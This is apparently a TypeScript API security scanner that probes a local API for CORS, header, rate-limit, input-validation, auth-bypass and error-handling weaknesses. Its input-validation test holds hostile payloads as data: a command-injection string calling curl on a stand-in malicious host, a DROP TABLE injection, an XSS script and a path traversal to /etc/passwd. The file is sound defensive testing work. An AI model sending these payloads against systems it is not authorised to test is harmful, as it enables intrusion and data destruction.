import { performance } from 'perf_hooks';
import type { SecurityScanResult, ScannerConfig } from './types';

export async function apiSecurityScan(config: ScannerConfig): Promise<SecurityScanResult> {
  const startTime = performance.now();
  
  console.log('🌐 Running API security analysis...');

  const vulnerabilities = [];
  const scannerVersion = 'api-security-v1.0';

  try {
    // Check if API server is running
    const apiUrl = process.env.API_URL || 'http://localhost:3001';
    console.log(`  🔍 Testing API security at ${apiUrl}...`);

    const apiVulns = await Promise.all([
      testCorsConfiguration(apiUrl),
      testSecurityHeaders(apiUrl),
      testRateLimiting(apiUrl),
      testInputValidation(apiUrl),
      testAuthenticationBypass(apiUrl),
      testErrorHandling(apiUrl),
    ]);

    // Flatten all vulnerability arrays
    vulnerabilities.push(...apiVulns.flat());

    // Analyze API structure for common security issues
    const structuralVulns = await analyzeApiStructure();
    vulnerabilities.push(...structuralVulns);

    console.log(`  ✅ API security scan completed, found ${vulnerabilities.length} issues`);

  } catch (error) {
    console.error('  ❌ API security scan failed:', error);
    
    // Add a vulnerability for API unavailability
    vulnerabilities.push({
      id: 'api-unavailable',
      severity: 'medium' as const,
      title: 'API server unavailable for security testing',
      description: 'Could not connect to API server for security analysis',
      category: 'api-security',
      confidence: 'high' as const,
      recommendation: 'Ensure API server is running during security scans',
    });
  }

  const duration = performance.now() - startTime;

  // Calculate summary
  const summary = {
    critical: vulnerabilities.filter(v => v.severity === 'critical').length,
    high: vulnerabilities.filter(v => v.severity === 'high').length,
    medium: vulnerabilities.filter(v => v.severity === 'medium').length,
    low: vulnerabilities.filter(v => v.severity === 'low').length,
    total: vulnerabilities.length,
  };

  console.log(`  📊 API Security Summary: ${summary.critical} critical, ${summary.high} high, ${summary.medium} medium, ${summary.low} low`);

  return {
    scanner: 'api-security',
    version: scannerVersion,
    timestamp: new Date().toISOString(),
    scan_duration_ms: duration,
    vulnerabilities,
    summary,
    metadata: {
      tests_performed: [
        'CORS configuration',
        'Security headers',
        'Rate limiting',
        'Input validation',
        'Authentication bypass',
        'Error handling'
      ],
    },
  };
}

async function testCorsConfiguration(apiUrl: string): Promise<any[]> {
  const vulnerabilities = [];

  try {
    // Test CORS with various origins
    const testOrigins = [
      'http://malicious-site.com',
      'https://evil.example',
      'null',
      '*',
    ];

    for (const origin of testOrigins) {
      const response = await fetch(`${apiUrl}/projects`, {
        method: 'GET',
        headers: {
          'Origin': origin,
        },
      });

      const corsHeader = response.headers.get('access-control-allow-origin');
      
      if (corsHeader === '*') {
        vulnerabilities.push({
          id: 'cors-wildcard',
          severity: 'medium' as const,
          title: 'CORS allows wildcard origin',
          description: 'API accepts requests from any origin (*), which may pose security risks',
          category: 'api-security',
          confidence: 'high' as const,
          recommendation: 'Configure specific allowed origins instead of using wildcard',
        });
        break;
      }

      if (corsHeader === origin && origin !== 'http://localhost:5173') {
        vulnerabilities.push({
          id: `cors-suspicious-origin-${origin}`,
          severity: 'high' as const,
          title: 'CORS allows suspicious origin',
          description: `API accepts requests from potentially malicious origin: ${origin}`,
          category: 'api-security',
          confidence: 'medium' as const,
          recommendation: 'Review and restrict CORS origins to trusted domains only',
        });
      }
    }

    // Test preflight requests
    const preflightResponse = await fetch(`${apiUrl}/projects`, {
      method: 'OPTIONS',
      headers: {
        'Origin': 'http://localhost:5173',
        'Access-Control-Request-Method': 'POST',
        'Access-Control-Request-Headers': 'Content-Type',
      },
    });

    if (!preflightResponse.ok) {
      vulnerabilities.push({
        id: 'cors-preflight-missing',
        severity: 'low' as const,
        title: 'CORS preflight not properly configured',
        description: 'OPTIONS requests for CORS preflight are not handled correctly',
        category: 'api-security',
        confidence: 'medium' as const,
        recommendation: 'Ensure proper CORS preflight handling for complex requests',
      });
    }

  } catch (error) {
    // CORS test failed - this might indicate API is not accessible
  }

  return vulnerabilities;
}

async function testSecurityHeaders(apiUrl: string): Promise<any[]> {
  const vulnerabilities = [];

  try {
    const response = await fetch(apiUrl);
    const headers = response.headers;

    // Check for security headers
    const securityHeaders = [
      {
        name: 'X-Content-Type-Options',
        expected: 'nosniff',
        severity: 'medium' as const,
        description: 'Prevents MIME type sniffing attacks',
      },
      {
        name: 'X-Frame-Options',
        expected: ['DENY', 'SAMEORIGIN'],
        severity: 'medium' as const,
        description: 'Prevents clickjacking attacks',
      },
      {
        name: 'X-XSS-Protection',
        expected: '1; mode=block',
        severity: 'low' as const,
        description: 'Enables XSS filtering (legacy browsers)',
      },
      {
        name: 'Strict-Transport-Security',
        expected: null, // Any value is good
        severity: 'high' as const,
        description: 'Enforces HTTPS connections',
        httpsOnly: true,
      },
      {
        name: 'Content-Security-Policy',
        expected: null,
        severity: 'medium' as const,
        description: 'Prevents XSS and data injection attacks',
      },
    ];

    for (const header of securityHeaders) {
      const headerValue = headers.get(header.name.toLowerCase());

      // Skip HSTS check for HTTP connections
      if (header.httpsOnly && !apiUrl.startsWith('https://')) {
        continue;
      }

      if (!headerValue) {
        vulnerabilities.push({
          id: `missing-security-header-${header.name.toLowerCase()}`,
          severity: header.severity,
          title: `Missing security header: ${header.name}`,
          description: header.description,
          category: 'api-security',
          confidence: 'high' as const,
          recommendation: `Add ${header.name} header to HTTP responses`,
        });
      } else if (header.expected && Array.isArray(header.expected)) {
        if (!header.expected.includes(headerValue)) {
          vulnerabilities.push({
            id: `weak-security-header-${header.name.toLowerCase()}`,
            severity: 'low' as const,
            title: `Weak security header value: ${header.name}`,
            description: `${header.name} header has value '${headerValue}', consider stronger options`,
            category: 'api-security',
            confidence: 'medium' as const,
            recommendation: `Use one of: ${header.expected.join(', ')}`,
          });
        }
      }
    }

    // Check for information disclosure headers
    const infoHeaders = ['server', 'x-powered-by', 'x-aspnet-version'];
    for (const headerName of infoHeaders) {
      if (headers.get(headerName)) {
        vulnerabilities.push({
          id: `info-disclosure-${headerName}`,
          severity: 'low' as const,
          title: `Information disclosure in ${headerName} header`,
          description: `${headerName} header reveals server information`,
          category: 'api-security',
          confidence: 'medium' as const,
          recommendation: `Remove or obfuscate ${headerName} header`,
        });
      }
    }

  } catch (error) {
    // Security headers test failed
  }

  return vulnerabilities;
}

async function testRateLimiting(apiUrl: string): Promise<any[]> {
  const vulnerabilities = [];

  try {
    console.log('    🔄 Testing rate limiting...');
    
    // Make rapid requests to test rate limiting
    const rapidRequests = [];
    for (let i = 0; i < 10; i++) {
      rapidRequests.push(fetch(`${apiUrl}/projects`));
    }

    const responses = await Promise.allSettled(rapidRequests);
    const rateLimitedCount = responses.filter(
      result => result.status === 'fulfilled' && 
      (result.value.status === 429 || result.value.status === 503)
    ).length;

    if (rateLimitedCount === 0) {
      vulnerabilities.push({
        id: 'rate-limiting-missing',
        severity: 'medium' as const,
        title: 'Rate limiting not implemented',
        description: 'API does not implement rate limiting, making it vulnerable to abuse',
        category: 'api-security',
        confidence: 'medium' as const,
        recommendation: 'Implement rate limiting to prevent API abuse and DoS attacks',
      });
    }

    // Test specific endpoints that should be rate limited
    const sensitiveEndpoints = ['/analyze', '/projects'];
    
    for (const endpoint of sensitiveEndpoints) {
      try {
        const endpointRequests = [];
        for (let i = 0; i < 5; i++) {
          if (endpoint === '/analyze') {
            endpointRequests.push(fetch(`${apiUrl}${endpoint}`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ text: 'package test\\nvalue: 42' }),
            }));
          } else {
            endpointRequests.push(fetch(`${apiUrl}${endpoint}`));
          }
        }

        const endpointResponses = await Promise.allSettled(endpointRequests);
        const endpointRateLimited = endpointResponses.filter(
          result => result.status === 'fulfilled' && 
          result.value.status === 429
        ).length;

        if (endpointRateLimited === 0 && endpoint === '/analyze') {
          vulnerabilities.push({
            id: `rate-limiting-missing-${endpoint.replace('/', '')}`,
            severity: 'high' as const,
            title: `Rate limiting missing on sensitive endpoint ${endpoint}`,
            description: `The ${endpoint} endpoint lacks rate limiting and could be abused`,
            category: 'api-security',
            confidence: 'high' as const,
            recommendation: `Implement strict rate limiting on ${endpoint} endpoint`,
          });
        }
      } catch (error) {
        // Skip endpoint if it fails
      }
    }

  } catch (error) {
    // Rate limiting test failed
  }

  return vulnerabilities;
}

async function testInputValidation(apiUrl: string): Promise<any[]> {
  const vulnerabilities = [];

  try {
    console.log('    🔍 Testing input validation...');

    // Test various malicious inputs
    const maliciousInputs = [
      { name: 'XSS', payload: '<script>alert("xss")</script>' },
      { name: 'SQL Injection', payload: "'; DROP TABLE users; --" },
      { name: 'Command Injection', payload: '$(curl http://malicious.com)' },
      { name: 'Path Traversal', payload: '../../../etc/passwd' },
      { name: 'Large Input', payload: 'A'.repeat(100000) },
      { name: 'Null Bytes', payload: 'test\\x00.txt' },
    ];

    for (const input of maliciousInputs) {
      try {
        // Test on /analyze endpoint
        const response = await fetch(`${apiUrl}/analyze`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ text: input.payload }),
        });

        // Check if server returns sensitive error information
        if (response.status === 500) {
          const errorText = await response.text();
          if (errorText.includes('stack trace') || 
              errorText.includes('internal server error') ||
              errorText.includes('database') ||
              errorText.includes('file system')) {
            vulnerabilities.push({
              id: `info-disclosure-error-${input.name.toLowerCase().replace(' ', '-')}`,
              severity: 'medium' as const,
              title: 'Information disclosure in error messages',
              description: `Server returns detailed error information for ${input.name} input`,
              category: 'api-security',
              confidence: 'medium' as const,
              recommendation: 'Return generic error messages to clients, log detailed errors server-side',
            });
          }
        }

        // Check if malicious input is reflected without sanitization
        if (response.ok) {
          const responseText = await response.text();
          if (responseText.includes(input.payload) && input.name === 'XSS') {
            vulnerabilities.push({
              id: 'xss-reflection',
              severity: 'high' as const,
              title: 'Potential XSS vulnerability',
              description: 'User input is reflected in response without proper sanitization',
              category: 'api-security',
              confidence: 'medium' as const,
              recommendation: 'Sanitize and validate all user input before processing or returning',
            });
          }
        }

      } catch (error) {
        // Skip if request fails
      }
    }

  } catch (error) {
    // Input validation test failed
  }

  return vulnerabilities;
}

async function testAuthenticationBypass(apiUrl: string): Promise<any[]> {
  const vulnerabilities = [];

  try {
    console.log('    🔐 Testing authentication security...');

    // Test for common authentication bypasses
    const bypassAttempts = [
      { name: 'Admin Path', path: '/admin' },
      { name: 'API Keys Endpoint', path: '/api/keys' },
      { name: 'Config Endpoint', path: '/config' },
      { name: 'Health Endpoint', path: '/health' },
      { name: 'Debug Endpoint', path: '/debug' },
      { name: 'Metrics Endpoint', path: '/metrics' },
    ];

    for (const attempt of bypassAttempts) {
      try {
        const response = await fetch(`${apiUrl}${attempt.path}`);
        
        if (response.ok) {
          const responseText = await response.text();
          
          // Check if sensitive information is exposed
          if (responseText.includes('password') || 
              responseText.includes('secret') ||
              responseText.includes('token') ||
              responseText.includes('key')) {
            vulnerabilities.push({
              id: `auth-bypass-${attempt.name.toLowerCase().replace(' ', '-')}`,
              severity: 'high' as const,
              title: `Potential authentication bypass: ${attempt.name}`,
              description: `${attempt.path} endpoint is accessible and may expose sensitive information`,
              category: 'api-security',
              confidence: 'medium' as const,
              recommendation: 'Ensure sensitive endpoints require proper authentication',
            });
          }
        }
      } catch (error) {
        // Skip if endpoint doesn't exist
      }
    }

  } catch (error) {
    // Authentication test failed
  }

  return vulnerabilities;
}

async function testErrorHandling(apiUrl: string): Promise<any[]> {
  const vulnerabilities = [];

  try {
    console.log('    ⚠️  Testing error handling...');

    // Test various error conditions
    const errorTests = [
      { name: 'Invalid JSON', body: '{ invalid json }', contentType: 'application/json' },
      { name: 'Large Request', body: 'A'.repeat(10000000), contentType: 'application/json' },
      { name: 'Invalid Content-Type', body: 'test', contentType: 'application/xml' },
    ];

    for (const test of errorTests) {
      try {
        const response = await fetch(`${apiUrl}/analyze`, {
          method: 'POST',
          headers: { 'Content-Type': test.contentType },
          body: test.body,
        });

        if (response.status >= 500) {
          const errorText = await response.text();
          
          // Check for information disclosure in error messages
          if (errorText.length > 1000 || 
              errorText.includes('at ') || 
              errorText.includes('stack') ||
              errorText.includes('node_modules')) {
            vulnerabilities.push({
              id: `verbose-errors-${test.name.toLowerCase().replace(' ', '-')}`,
              severity: 'low' as const,
              title: 'Verbose error messages',
              description: `Server returns detailed error information for ${test.name}`,
              category: 'api-security',
              confidence: 'medium' as const,
              recommendation: 'Return generic error messages and log detailed errors server-side',
            });
          }
        }
      } catch (error) {
        // Skip if request fails
      }
    }

  } catch (error) {
    // Error handling test failed
  }

  return vulnerabilities;
}

async function analyzeApiStructure(): Promise<any[]> {
  const vulnerabilities = [];

  try {
    // Analyze server.ts file for security issues
    const serverFiles = await findServerFiles();
    
    for (const file of serverFiles) {
      const content = await Bun.file(file).text();
      
      // Check for hardcoded secrets
      if (content.includes('password') || content.includes('secret') || content.includes('key')) {
        const lines = content.split('\\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i];
          if ((line.includes('password') || line.includes('secret') || line.includes('key')) &&
              (line.includes('=') || line.includes(':'))) {
            vulnerabilities.push({
              id: `api-hardcoded-secret-${i}`,
              severity: 'high' as const,
              title: 'Potential hardcoded secret in API code',
              description: 'API source code may contain hardcoded secrets',
              file,
              line: i + 1,
              category: 'api-security',
              confidence: 'medium' as const,
              recommendation: 'Use environment variables or secure secret management',
            });
            break; // Only report once per file
          }
        }
      }

      // Check for disabled security features
      if (content.includes('cors: false') || content.includes('helmet: false')) {
        vulnerabilities.push({
          id: 'api-security-disabled',
          severity: 'medium' as const,
          title: 'Security middleware disabled',
          description: 'Security middleware (CORS, Helmet, etc.) appears to be disabled',
          file,
          category: 'api-security',
          confidence: 'medium' as const,
          recommendation: 'Enable security middleware for production deployments',
        });
      }

      // Check for debug/development code
      if (content.includes('console.log') && content.includes('password')) {
        vulnerabilities.push({
          id: 'api-debug-logging',
          severity: 'medium' as const,
          title: 'Potential sensitive data logging',
          description: 'API code may log sensitive information to console',
          file,
          category: 'api-security',
          confidence: 'low' as const,
          recommendation: 'Remove or sanitize debug logging statements',
        });
      }
    }

  } catch (error) {
    // API structure analysis failed
  }

  return vulnerabilities;
}

async function findServerFiles(): Promise<string[]> {
  try {
    const findProc = spawn(['find', '.', '-name', '*.ts', '-path', '*/api/*', '-not', '-path', '*/node_modules/*'], {
      stdout: 'pipe',
      stderr: 'pipe',
    });

    await findProc.exited;

    if (findProc.exitCode === 0) {
      return (await new Response(findProc.stdout).text())
        .trim()
        .split('\\n')
        .filter(line => line.trim());
    }
  } catch (error) {
    // Fallback
  }

  return [];
}